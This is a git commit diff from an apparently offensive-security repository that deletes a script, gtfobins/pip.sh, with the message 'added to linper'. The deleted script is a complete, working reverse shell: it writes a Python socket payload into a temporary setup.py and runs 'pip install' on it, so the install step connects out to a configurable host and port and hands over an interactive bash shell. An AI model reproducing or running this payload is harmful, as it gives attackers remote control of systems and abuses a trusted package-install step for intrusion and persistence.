61690b997da5f8a97a56cd94bcfc62efa5648a7e
montysecurity <18372298+montysecurity@users.noreply.github.com>
2021-02-05 04:25:05 -0600

    added to linper

--- gtfobins/pip.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-export SHELL="/bin/bash"
-export RHOST=0.0.0.0
-export RPORT=5253
-TF=$(mktemp -d)
-echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$RHOST'",'$RPORT'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["'$SHELL'","-i"]);' > $TF/setup.py; pip install $TF
